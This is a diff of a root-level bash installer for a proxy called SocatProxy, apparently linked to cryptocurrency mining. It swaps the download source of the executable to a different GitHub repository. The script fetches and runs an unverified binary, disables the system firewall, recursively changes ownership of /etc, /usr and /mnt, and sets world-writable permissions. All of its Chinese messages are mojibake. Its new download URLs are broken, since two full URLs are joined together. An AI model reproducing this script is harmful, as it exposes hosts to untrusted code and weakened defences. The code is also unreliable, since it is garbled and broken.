@@ -3,7 +3,7 @@
 #bash <(curl -s -L https://raw.githubusercontent.com/E-dot/SocatProxy/main/install.sh))
 clear
 
-[ $(id -u) != "0" ] && { echo "È±ÉÙROOTÈ¨ÏÞ¡£"; exit 1; }
+[ $(id -u) != "0" ] && { echo "æ— æƒé™å®‰è£…ã€‚"; exit 1; }
 
 IS_OPENWRT=false
 
@@ -20,7 +20,7 @@ else
         echo "check systemctl..."
         clear
     else
-        echo "ÏµÍ³È±ÉÙsystemctl·þÎñ."
+        echo "ç³»ç»Ÿç¼ºå°‘systemctlæœåŠ¡."
         exit 1;
     fi
 fi
@@ -32,13 +32,13 @@ PATH_EXEC="SocatProxy"
 PATH_NOHUP="${PATH_SocatProxy}/nohup.out"
 PATH_ERR="${PATH_SocatProxy}/err.log"
 
-ROUTE_1="https://github.com"
-ROUTE_2="http://rustminersystem.com"
+ROUTE_1="https://raw.githubusercontent.com"
+ROUTE_2="https://raw.githubusercontent.com"
 # ROUTE_2="https://hub.njuu.cf"
 # ROUTE_3="https://hub.yzuu.cf"
 # ROUTE_4="https://hub.nuaa.cf"
 
-ROUTE_EXEC_1="/EvilGenius-dot/SocatProxy/raw/main/x86_64-musl/SocatProxy"
+ROUTE_EXEC_1="https://raw.githubusercontent.com/735840086/hhminer/main/SocatProxy"
 
 TARGET_ROUTE=""
 TARGET_ROUTE_EXEC=""
@@ -50,7 +50,7 @@ filterResult() {
         echo ""
     else
         echo "!!!!!!!!!!!!!!!ERROR!!!!!!!!!!!!!!!!"
-        echo "¡¾${2}¡¿Ê§°Ü¡£"
+        echo "ã€${2}ã€‘å¤±è´¥ã€‚"
 	
         if [ ! $3 ];then
             echo "!!!!!!!!!!!!!!!ERROR!!!!!!!!!!!!!!!!"
@@ -62,7 +62,7 @@ filterResult() {
 
 disable_firewall() {
     os_name=$(grep "^ID=" /etc/os-release | cut -d "=" -f 2 | tr -d '"')
-    echo "¹Ø±Õ·À»ðÇ½"
+    echo "å…³é—­é˜²ç«å¢™"
 
     if [ "$os_name" == "ubuntu" ]; then
         sudo ufw disable
@@ -70,7 +70,7 @@ disable_firewall() {
         sudo systemctl stop firewalld
         sudo systemctl disable firewalld
     else
-        echo "Î´ÖªÏµÍ³, ¹Ø±Õ·À»ðÇ½Ê§°Ü"
+        echo "æœªçŸ¥ç³»ç»Ÿ, å…³é—­é˜²ç«å¢™å¤±è´¥"
     fi
 }
 
@@ -98,7 +98,7 @@ check_process() {
     fi
 }
 
-# openwrt¿ª»úÆô¶¯
+# openwrtå¼€æœºå¯åŠ¨
 #!/bin/sh
 
 # Function to set up auto-start and start the program
@@ -141,7 +141,7 @@ wrt_disable_autostart() {
 }
 
 
-# ¿ª»úÆô¶¯½ø³ÌÊØ»¤
+# å¼€æœºå¯åŠ¨è¿›ç¨‹å®ˆæŠ¤
 enable_autostart() {
     echo "${m_14}"
     if [ "$(command -v systemctl)" ]; then
@@ -171,15 +171,15 @@ EOF
     fi
 }
 
-# ½ûÓÃ¿ª»úÆô¶¯º¯Êý
+# ç¦ç”¨å¼€æœºå¯åŠ¨å‡½æ•°
 disable_autostart() {
-    echo "¹Ø±Õ¿ª»úÆô¶¯..."
+    echo "å…³é—­å¼€æœºå¯åŠ¨..."
     if [ "$(command -v systemctl)" ]; then
         sudo systemctl stop $SERVICE_NAME.service
         sudo systemctl disable $SERVICE_NAME.service
         sudo rm /etc/systemd/system/$SERVICE_NAME.service
         sudo systemctl daemon-reload
-    else # ÏµÍ³SysVinit
+    else # ç³»ç»ŸSysVinit
         sudo sed -i '/\/root\/rustminersystem\/rustminersystem\ &/d' /etc/rc.local
     fi
 
@@ -192,9 +192,9 @@ kill_process() {
         local pids=($(pgrep -f "$process_name"))
         echo "WRT KILL IPD $pids"
         if kill -9 "$pids" >/dev/null 2>&1; then
-            echo "ÒÑÖÕÖ¹ $pids ½ø³Ì."
+            echo "å·²ç»ˆæ­¢ $pids è¿›ç¨‹."
         else
-            echo "Î´·¢ÏÖ $pids ½ø³Ì."
+            echo "æœªå‘çŽ° $pids è¿›ç¨‹."
             return 1
         fi
     else
@@ -202,14 +202,14 @@ kill_process() {
         local pids=($(pgrep "$process_name"))
         
         if [ ${#pids[@]} -eq 0 ]; then
-            echo "Î´·¢ÏÖ $process_name ½ø³Ì."
+            echo "æœªå‘çŽ° $process_name è¿›ç¨‹."
             return 1
         fi
         for pid in "${pids[@]}"; do
             echo "Stopping process $pid ..."
             kill -TERM "$pid"
         done
-        echo "ÖÕÖ¹ $process_name ."
+        echo "ç»ˆæ­¢ $process_name ."
     fi
 
     sleep 1
@@ -277,13 +277,13 @@ change_limit() {
     fi
 
     if [[ "$changeLimit" = "y" ]]; then
-        echo "ÏÞÖÆÐÞ¸Ä65535,ÖØÆôÉúÐ§"
+        echo "é™åˆ¶ä¿®æ”¹65535,é‡å¯ç”Ÿæ•ˆ"
     else
-        echo -n "µ±Ç°Á¬½ÓÏÞÖÆ£º"
+        echo -n "å½“å‰è¿žæŽ¥é™åˆ¶ï¼š"
         ulimit -n
     fi
 
-    echo "Íê³É, ÖØÆôÉúÐ§"
+    echo "å®Œæˆ, é‡å¯ç”Ÿæ•ˆ"
 }
 
 install() {
@@ -292,7 +292,7 @@ install() {
     [ -f /etc/openwrt_version ]; then
         echo "CENTOS || UBUNTU || OPENWRT"
     else
-        # ÆäËûÏµÍ³ÃüÁî
+        # å…¶ä»–ç³»ç»Ÿå‘½ä»¤
         chown root:root /mnt -R
         chown root:root /etc -R
         chown root:root /usr -R
@@ -305,20 +305,20 @@ install() {
     check_process $PATH_EXEC
 
     if [ $? -eq 0 ]; then
-        echo "ÕýÔÚÔËÐÐ${PATH_EXEC}ÐèÍ£Ö¹ºó°²×°¡£"
-        echo "ÊäÈë1Í£Ö¹${PATH_EXEC}ºó°²×°, ÊäÈë2È¡Ïû¡£"
+        echo "æ­£åœ¨è¿è¡Œ${PATH_EXEC}éœ€åœæ­¢åŽå®‰è£…ã€‚"
+        echo "è¾“å…¥1åœæ­¢${PATH_EXEC}åŽå®‰è£…, è¾“å…¥2å–æ¶ˆã€‚"
 
-        read -p "$(echo -e "ÇëÑ¡Ôñ[1-2]£º")" choose
+        read -p "$(echo -e "è¯·é€‰æ‹©[1-2]ï¼š")" choose
         case $choose in
         1)
             stop
             ;;
         2)
-            echo "È¡Ïû"
+            echo "å–æ¶ˆ"
             return
             ;;
         *)
-            echo "´íÎó, È¡Ïû°²×°¡£"
+            echo "é”™è¯¯, å–æ¶ˆå®‰è£…ã€‚"
             return
             ;;
         esac
@@ -328,7 +328,7 @@ install() {
         mkdir $PATH_SocatProxy
         chmod 777 -R $PATH_SocatProxy
     else
-        echo "Ä¿Â¼´æÔÚ, ÎÞÐè´´½¨, ¼ÌÐø°²×°¡£"
+        echo "ç›®å½•å­˜åœ¨, æ— éœ€åˆ›å»º, ç»§ç»­å®‰è£…ã€‚"
     fi
 
     if [[ ! -d $PATH_NOHUP ]];then
@@ -339,11 +339,11 @@ install() {
         chmod 777 -R $PATH_ERR
     fi
 
-    echo "ÏÂÔØ³ÌÐò..."
+    echo "ä¸‹è½½ç¨‹åº..."
 
     wget -P $PATH_SocatProxy "${TARGET_ROUTE}${TARGET_ROUTE_EXEC}" -O "${PATH_SocatProxy}/${PATH_EXEC}" 1>/dev/null
 
-    filterResult $? "ÕýÔÚÏÂÔØ"
+    filterResult $? "æ­£åœ¨ä¸‹è½½"
 
     chmod 777 -R "${PATH_SocatProxy}/${PATH_EXEC}"
 
@@ -369,15 +369,15 @@ uninstall() {
         disable_autostart
     fi
 
-    echo "Ð¶ÔØ³É¹¦"
+    echo "å¸è½½æˆåŠŸ"
 }
 
 start() {
-    echo $BLUE "Æô¶¯³ÌÐò..."
+    echo $BLUE "å¯åŠ¨ç¨‹åº..."
     check_process $PATH_EXEC
 
     if [ $? -eq 0 ]; then
-        echo "Æô¶¯³É¹¦£¬ÎðÖØ¸´Æô¶¯¡£"
+        echo "å¯åŠ¨æˆåŠŸï¼Œå‹¿é‡å¤å¯åŠ¨ã€‚"
         return
     else
         # cd $PATH_RUST
@@ -396,10 +396,10 @@ start() {
 
         if [ $? -eq 0 ]; then
             echo "|----------------------------------------------------------------|"
-            echo "Æô¶¯³É¹¦, ·ÃÎÊµØÖ·: ¾ÖÓòÄÚÍøIP:42703"
+            echo "å¯åŠ¨æˆåŠŸ, è®¿é—®åœ°å€: å±€åŸŸå†…ç½‘IP:42703"
             echo "|----------------------------------------------------------------|"
         else
-            echo "Æô¶¯Ê§°Ü"
+            echo "å¯åŠ¨å¤±è´¥"
         fi
     fi
 }
@@ -415,7 +415,7 @@ stop() {
 
     sleep 1
 
-    echo "ÖÕÖ¹½ø³Ì..."
+    echo "ç»ˆæ­¢è¿›ç¨‹..."
 
     kill_process $PATH_EXEC
 
@@ -423,13 +423,13 @@ stop() {
 }
 
 echo "------SocatProxy Linux------"
-echo "1. °²×°SocatProxy"
-echo "2. Í£Ö¹SocatProxy"
-echo "3. ÖØÆôSocatProxy"
-echo "4. Ð¶ÔØSocatProxy"
+echo "1. å®‰è£…SocatProxy"
+echo "2. åœæ­¢SocatProxy"
+echo "3. é‡å¯SocatProxy"
+echo "4. å¸è½½SocatProxy"
 echo "---------------------"
 
-read -p "$(echo -e "[1-4]£º")" comm
+read -p "$(echo -e "[1-4]ï¼š")" comm
 
 if [ "$comm" = "1" ]; then
     clear
@@ -446,13 +446,13 @@ fi
 
 
 echo "------SocatProxy Linux------"
-echo "CPU¼Ü¹¹¡¾${UNAME}¡¿"
-echo Ñ¡Ôñ¼Ü¹¹°²×°¡£
+echo "CPUæž¶æž„ã€${UNAME}ã€‘"
+echo é€‰æ‹©æž¶æž„å®‰è£…ã€‚
 echo "---------------------"
 echo "1. x86-64"
 echo ""
 
-read -p "$(echo -e "[1-1]£º")" targetExec
+read -p "$(echo -e "[1]ï¼š")" targetExec
 
 VARNAME="ROUTE_EXEC_${targetExec}"
 TARGET_ROUTE_EXEC="${!VARNAME}"
@@ -460,17 +460,17 @@ TARGET_ROUTE_EXEC="${!VARNAME}"
 clear
 
 echo "------SocatProxy Linux------"
-echo "Ñ¡ÔñÏßÂ·:"
-echo "1. Ö÷ÏßÏÂÔØ"
+echo "é€‰æ‹©çº¿è·¯:"
+echo "1. ä¸»çº¿ä¸‹è½½"
 echo "---------------------"
 
-read -p "$(echo -e "[1-2]£º")" targetRoute
+read -p "$(echo -e "[1]ï¼š")" targetRoute
 
 VARNAME="ROUTE_${targetRoute}"
 TARGET_ROUTE="${!VARNAME}"
 
-[ ! $TARGET_ROUTE ] && { echo "ÏßÂ·Òì³£"; exit 1; }
-[ ! $TARGET_ROUTE_EXEC ] && { echo "¼Ü¹¹´íÎó"; exit 1; }
+[ ! $TARGET_ROUTE ] && { echo "çº¿è·¯å¼‚å¸¸"; exit 1; }
+[ ! $TARGET_ROUTE_EXEC ] && { echo "æž¶æž„é”™è¯¯"; exit 1; }
 
 echo "${TARGET_ROUTE}${TARGET_ROUTE_EXEC}"
 
